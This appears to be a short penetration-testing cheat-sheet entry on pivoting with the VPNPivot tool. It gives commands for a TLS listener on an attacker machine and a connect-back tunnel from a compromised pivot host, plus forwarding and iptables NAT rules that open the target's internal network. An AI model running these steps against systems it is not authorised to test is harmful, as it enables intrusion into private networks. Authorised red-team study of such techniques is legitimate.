# VPN Tunnel

## Tool: VPN Pivot

Link: https://github.com/0x36/VPNPivot

Same as SSH VPN, but we use TLS/SSL instead of SSH

### 1) On the attacker machine

    sudo pivots -i tun1 -I $newInterfaceIP/24 -p $listeningPort -v

### 2) On the pivot machine

    sudo sysctl net.ipv4.conf.default.forwarding=1
    sudo pivotc $ATTACKER $listeningPort $targetNetwork

    sudo iptables -t nat -A POSTROUTING -s $ATTACKER -o $INTERFACE -j MASQUERADE
    sudo iptables -t nat -A POSTROUTING -s $ATTACKER -d $targetNetwork -j MASQUERADE
